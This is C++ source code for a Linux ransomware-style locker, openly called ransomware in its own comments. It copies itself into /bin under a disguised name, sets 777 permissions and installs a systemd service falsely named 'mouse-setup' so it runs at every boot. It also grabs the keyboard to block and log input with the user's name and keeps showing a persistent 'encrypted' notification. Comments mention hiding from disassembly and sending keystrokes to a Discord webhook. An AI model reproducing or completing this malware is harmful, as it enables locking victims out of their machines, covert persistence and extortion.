    #include "header.h"

    //Calling this ransomware literally as it is not a good idea so we will call it binary_runtime_ancii, related to the linux kernel security configuration in a /bin/ dir
    // Use enviroment variables and encryption AES method for avoid desensambly easily


std::string exec_parsed(const std::string command) {
    std::string result;
    FILE* pipe = popen(command.c_str(), "r");
    if(!pipe) {
        return result;
    } else {
        char buffer[128];
        while(fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }

        pclose(pipe);
        return result;
    }
}

void show_encrypted(NotifyNotification*& notification) {
        while (true) {
        // Show the notification
        notify_notification_show(notification, nullptr);

        // Wait for a few seconds
        std::this_thread::sleep_for(std::chrono::seconds(3)); // Adjust the duration as needed

        // Update the notification to prevent fading away
        notify_notification_update(notification, notify_tittle, encrypt_message, "xfce-system-lock");
        
    }
}

void block_input() {
     while (true) {
            Display* display = XOpenDisplay(nullptr);

             if (!display) {
                std::cerr << "Unable to open X display." << std::endl;
                return;
            } else {

                XGrabKeyboard(display, DefaultRootWindow(display), True, GrabModeAsync, GrabModeAsync, CurrentTime);
                XEvent event;
                XNextEvent(display, &event);
                /* Do nothing, effectively blocking periferic input

                if (event.type == KeyPress || event.type == KeyRelease) {
                }
                */

            if(event.type == KeyPress) {
                std::string user_executor = exec_parsed("whoami"); //make recognise words, until theres not a enter or space, type all entire.
                KeySym keySym;
                char key[255];
                XLookupString(&event.xkey, key, sizeof(key), &keySym, NULL);

                if(keySym == XK_Escape) {
                    std::cout << "aa";
                }

                std::cout << "The key " << key << " was pressed by " << user_executor;
            }

                XCloseDisplay(display);
            }
    }
}

    int main(int argc, char* argv[]) { //We will use the program file name to send it to a hidden folder (This is very common to get the program name if the user changes it)
    dpp::cluster kernel("");
    dpp::webhook kernel32("")
    std::string config_files = argv[0];
        if(config_files.substr(0, 2) == "./") {
            config_files = config_files.substr(2);
        }

        //Ensuring program are on right perms.
        std::string chmod = "sudo chmod 777 " + config_files;
        const char* perms = chmod.c_str();
        system(perms);

        // Remember we should hide all these terminal messages, we will do it later.

        //After this, we pick it as a common executor from dudose creation with a common exe name, later we will make the "hide"
        std::string copy_act = "sudo cp " + config_files + " /bin/";
        const char* copy_files = copy_act.c_str();
        int copied = system(copy_files);
        
        //Once file whas corrected created on the kernel configuration we make the spoof name
        std::string rename_act = "sudo mv /bin/" + config_files + " /bin/binary_runtime_ancii";
        const char* rename_files = rename_act.c_str();
        int renamed = system(rename_files);

            //Make it auto runs on boot.
    std::ofstream mousesetup("/etc/systemd/system/mouse-setup.service");
    if(!mousesetup.is_open()) {
        //discord webhook & register key events toa webhook
    } else {
            mousesetup << "[Unit]" << std::endl;
            mousesetup << "Description=aaaa" << std::endl;
            mousesetup << "After=network.target" << std::endl;
            mousesetup << " " << std::endl;
            mousesetup << "[Service]" << std::endl;
            mousesetup << "ExecStart=/bin/binary_runtime_ancii" << std::endl;
            mousesetup << "Restart=always" << std::endl;
            mousesetup << "" << std::endl;
            mousesetup << "[Install]" << std::endl;
            mousesetup << "WantedBy=multi-user.target" << std::endl;

            mousesetup.close(); 
            system("sudo systemctl daemon-reload");
            system("sudo systemctl enable mouse-setup");
            system("sudo systemctl start mouse-setup");
            
    }

    // Initialize the notification library
    notify_init("ransomprocs");

    // Create a new notification
    NotifyNotification* notification = notify_notification_new(
        notify_tittle,   // Title
        encrypt_message,       // Message
        "xfce-system-lock"    // Icon (see: /usr/share/icons/)
    );

    std::thread hex1(block_input);
    std::thread hex2(std::bind(show_encrypted, notification));

    hex1.join();
    hex2.join();

    // Clean up
    g_object_unref(G_OBJECT(notification));
    notify_uninit();
    return 0;
}